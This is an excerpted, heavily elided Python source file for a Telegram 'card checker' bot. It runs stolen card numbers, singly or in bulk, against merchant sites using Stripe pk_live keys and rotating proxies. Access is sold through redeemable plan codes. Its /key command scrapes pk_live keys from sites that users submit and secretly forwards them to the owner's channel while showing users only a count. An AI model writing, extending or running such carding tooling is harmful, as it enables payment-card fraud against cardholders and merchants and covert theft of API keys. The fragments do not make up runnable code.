...
def process_card_enhanced(domain, ccx, proxy_dict=None, pk_override=None):
    ccx = ccx.strip()
    try:
    ...
    if not pk:
        return {"Response": "No pk_live key available", "Status": "Declined"}
...
async def send_to_admin_channel(bot, text):
    """Send to GC if set, else to owner's DM."""
    gid = cfg_get("gc_id", "")
    target = None
    if gid:
        try:
    ...
    try:
        ...
        logger.warning(f"send_to_admin_channel failed: {e}")
...
async def cmd_start(update, ctx):
    ...
    txt = (
        ...
        f"⚡ /mass — bulk check\n"
        f"🌐 <code>/key N</code> — extract from sites\n"
...
async def cmd_help(update, ctx):
    ...
    txt = (
        ...
        f"🌐 <code>/key 5</code> — extract pk_live keys from sites\n"
        f"    <i>keys are sent to admin, not shown here</i>\n"
        f"🔑 <code>/redeem OGGY-PROO-XXXX</code>\n"
        f"👤 <code>/me</code>"
    )
    if is_admin or is_owner:
    ...
    if is_owner:
        txt += (
            ...
            f"🌐 <code>/sites</code>\n"
            f"🧦 <code>/setproxies</code> — paste proxy list\n"
            f"🧦 <code>/clearproxies</code>  ·  <code>/getproxies</code>\n"
            f"🔑 <code>/setpks</code> — paste pk_live keys\n"
            f"🔑 <code>/clearpks</code>  ·  <code>/getpks</code>\n"
    ...
    if u.id != OWNER_ID and not user_is_admin(u.id):
        ...
        if row and row["expiry_ts"] and row["expiry_ts"] > now_ts():
            ...
            await update.effective_message.reply_text(
                ...
                f"💎 {left} remaining.\n\nYou can redeem again once it expires.",
                parse_mode=ParseMode.HTML)
            return
...
async def cmd_single(update, ctx):
    ...
    res = await loop.run_in_executor(None, process_card_enhanced, site, cc, proxy, pk)
    with db() as c:
...
async def cmd_mass(update, ctx):
    ...
    if not user_has_plan(u.id):
        await update.effective_message.reply_text("🚫 No active plan. <code>/redeem</code>.",
                                                  parse_mode=ParseMode.HTML); return
...
async def cmd_revoke(update, ctx):
    ...
    ok = user_revoke(uid)
    await update.effective_message.reply_text(
        f"♻️ Revoked <code>{uid}</code>" if ok else "❌ Not found.",
        parse_mode=ParseMode.HTML)
...
async def cmd_setpks(update, ctx):
    ...
    await update.effective_message.reply_text(
        "🔑 Send pk_live keys, one per line.\n"
        "Example: <code>pk_live_51AbcXYZ...</code>",
        parse_mode=ParseMode.HTML)
    ...
    try:
        ...
        if data == "u:key_hint":
            ...
            await q.message.reply_text(
                "🌐 <code>/key 5</code>\n<i>Keys are sent to admin, not shown.</i>",
                parse_mode=ParseMode.HTML); return
        ...
        if data == "o:proxies_test":
            ...
            for l in lines:
                ...
                if not pd: continue
                ok, _ = await loop.run_in_executor(None, test_proxy_live, pd)
                if ok: work += 1
...
async def _mass_worker(uid, cards, site):
    ...
    for idx, card in enumerate(cards):
        ...
        try:
            res = await loop.run_in_executor(None, process_card_enhanced, site, card, proxy, pk)
        except Exception as e:
...
async def on_text(update, ctx):
    ...
    if st.get("pending") == "awaiting_pks" and u.id == OWNER_ID:
        ...
        await msg.reply_text(
            f"🔑 Saved <b>{len(valid)}</b> valid pk keys.\n"
            f"⚠️ Skipped {len(lines) - len(valid)} invalid lines.",
            parse_mode=ParseMode.HTML)
        return

    # awaiting sites for /key (user) — extract, forward to admin/GC, don't show
    if st.get("pending") == "awaiting_sites_for_key":
        ...
        if not found:
            await m2.edit_text(
                f"❌ <b>No pk_live keys found</b> in {len(sites)} sites.",
                parse_mode=ParseMode.HTML)
            return

        # forward each key to GC or owner chat
        for site, key in found:
            fwd = (
                f"🔑 <b>PK_LIVE KEY FOUND</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🌐 <code>{html.escape(site)}</code>\n"
                f"🔑 <code>{key}</code>\n"
                f"👤 <code>{u.id}</code> · @{u.username or '—'}"
            )
            await send_to_admin_channel(ctx.bot, fwd)

        # tell user only the count, not the keys
        await m2.edit_text(
